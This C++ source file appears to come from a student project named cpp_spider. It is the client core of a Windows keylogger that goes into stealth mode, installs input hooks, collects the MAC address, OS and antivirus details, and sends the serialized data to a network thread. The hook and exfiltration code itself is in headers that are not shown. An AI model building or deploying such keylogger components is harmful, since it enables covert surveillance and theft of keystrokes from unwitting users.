/*
** ClientCore.cpp for cpp_spider in /home/god/TEK3/C++/cpp_spider/sources/ClientCore.cpp
**
** Made by Maxime PILLON
** Login   <maxime.pillon@epitech.eu>
**
** Started on  Thu Oct 05 10:59:44 2017 Maxime PILLON
** Last update Thu Oct 05 10:59:44 2017 Maxime PILLON
*/

#include <boost/make_unique.hpp>
#include "Protocol/BufferSender.hpp"
#include "Protocol/ClientProtocol.hpp"
#include "KeyLogger/WindowsKeyLogger.hpp"
#include  "Thread/IThread.hpp"
#include "ClientCore.hpp"
#include "Thread/BoostThread.hpp"

spider::ClientCore::ClientCore() : _proto(new spider::ClientProtocol()),
				   _keylogger(new spider::WindowsKeyLogger())
{}

spider::ClientCore::~ClientCore()
{}

void spider::ClientCore::run()
{
  MSG msg;
  bool running;
  std::unique_ptr<spider::IThread>	thread(boost::make_unique<BoostThread>());
  std::unique_ptr<spider::IThread>	threadnet(boost::make_unique<BoostThread>());

  running = true;
  _keylogger->stealth();
  _keylogger->initHooks();
  _keylogger->getMacAddr();
  _keylogger->getOperatingSystem();
  _keylogger->getAntiVirus();
  if (threadnet)
  {
    threadnet.get()->createNetThread();
  }
  if (thread)
  {
    thread.get()->createThread(_proto);
  }
  spider::BufferSender::BufferSenderInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*(_keylogger->getInfos()))));
  while (running)
  {
    if (!GetMessage(&msg, nullptr, 0, 0))
    {
      running = false;
    }
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }
}